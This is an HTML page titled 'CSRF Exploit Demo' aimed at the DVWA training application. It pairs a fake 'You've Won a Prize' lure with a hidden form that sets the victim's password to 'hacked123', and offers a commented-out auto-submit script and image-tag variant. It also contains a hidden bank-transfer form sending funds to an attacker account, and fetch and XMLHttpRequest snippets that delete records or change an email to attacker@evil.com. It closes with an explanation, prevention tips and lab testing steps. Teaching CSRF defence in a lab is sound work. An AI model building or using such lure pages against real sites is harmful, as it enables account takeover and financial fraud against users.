<!DOCTYPE html>
<html>
<head>
    <title>CSRF Exploit Demo</title>
</head>
<body>
    <h1>üéÅ Congratulations! You've Won a Prize!</h1>
    <p>Click the button below to claim your reward...</p>
    
    <!-- CSRF Attack: Hidden password change form -->
    <form id="csrfForm" action="http://localhost/dvwa/vulnerabilities/csrf/" method="GET" style="display:none;">
        <input type="hidden" name="password_new" value="hacked123">
        <input type="hidden" name="password_conf" value="hacked123">
        <input type="hidden" name="Change" value="Change">
    </form>
    
    <!-- Visible button that triggers the hidden form -->
    <button onclick="document.getElementById('csrfForm').submit()" style="
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        color: white;
        padding: 15px 30px;
        border: none;
        border-radius: 8px;
        font-size: 18px;
        cursor: pointer;
        box-shadow: 0 4px 6px rgba(0,0,0,0.1);
    ">
        Claim Your Prize! üéâ
    </button>
    
    <!-- Alternative: Auto-submit (more dangerous) -->
    <!-- 
    <script>
        // Automatically submit form when page loads
        window.onload = function() {
            document.getElementById('csrfForm').submit();
        };
    </script>
    -->
    
    <!-- Alternative: Image-based GET request attack -->
    <!--
    <img src="http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none;">
    -->
    
    <hr>
    
    <h2>Alternative Attack: Bank Transfer</h2>
    <p>This example demonstrates a CSRF attack on a banking application:</p>
    
    <form id="bankTransfer" action="http://vulnerable-bank.com/transfer" method="POST" style="display:none;">
        <input type="hidden" name="amount" value="10000">
        <input type="hidden" name="to_account" value="attacker_account_123">
        <input type="hidden" name="currency" value="USD">
    </form>
    
    <button onclick="document.getElementById('bankTransfer').submit()" style="
        background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
        color: white;
        padding: 15px 30px;
        border: none;
        border-radius: 8px;
        font-size: 18px;
        cursor: pointer;
        box-shadow: 0 4px 6px rgba(0,0,0,0.1);
    ">
        Check Balance üí∞
    </button>
    
    <hr>
    
    <h2>Educational Note</h2>
    <p style="background: #fff3cd; padding: 15px; border-left: 4px solid #ffc107; margin: 20px 0;">
        ‚ö†Ô∏è <strong>Warning:</strong> This code is for educational purposes only. 
        Use only in controlled lab environments like DVWA. Unauthorized use is illegal!
    </p>
    
    <h3>How This Attack Works:</h3>
    <ol>
        <li>Victim is logged into vulnerable application (e.g., DVWA)</li>
        <li>Victim visits this malicious page</li>
        <li>Hidden form contains malicious request</li>
        <li>When button is clicked (or auto-submit), request is sent</li>
        <li>Victim's browser includes authentication cookies automatically</li>
        <li>Server processes request as if victim intended it</li>
    </ol>
    
    <h3>Prevention:</h3>
    <ul>
        <li>‚úÖ Implement anti-CSRF tokens</li>
        <li>‚úÖ Check Referer/Origin headers</li>
        <li>‚úÖ Use SameSite cookie attribute</li>
        <li>‚úÖ Require re-authentication for sensitive actions</li>
        <li>‚úÖ Use POST for state-changing operations (not GET)</li>
    </ul>
    
    <hr>
    
    <h2>Testing Instructions</h2>
    <ol>
        <li>Set up DVWA with Security Level: Low</li>
        <li>Log in to DVWA as admin/password</li>
        <li>Save this HTML file locally</li>
        <li>Open this file in the same browser</li>
        <li>Click the "Claim Your Prize" button</li>
        <li>Go back to DVWA and try logging in with password "hacked123"</li>
    </ol>
    
    <div style="margin-top: 40px; padding: 20px; background: #f8f9fa; border-radius: 8px;">
        <h3>Advanced CSRF Techniques:</h3>
        
        <h4>1. Using Fetch API (Modern CSRF)</h4>
        <pre style="background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 4px; overflow-x: auto;">
fetch('http://vulnerable-site.com/api/delete', {
    method: 'POST',
    credentials: 'include', // Include cookies
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({id: 123})
});</pre>
        
        <h4>2. Using XMLHttpRequest</h4>
        <pre style="background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 4px; overflow-x: auto;">
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://vulnerable-site.com/change-email', true);
xhr.withCredentials = true;
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('email=attacker@evil.com');</pre>
        
        <h4>3. Image-Based GET Attack</h4>
        <pre style="background: #2d2d2d; color: #f8f8f2; padding: 15px; border-radius: 4px; overflow-x: auto;">
&lt;img src="http://site.com/delete?id=123" style="display:none"&gt;</pre>
    </div>
</body>
</html>
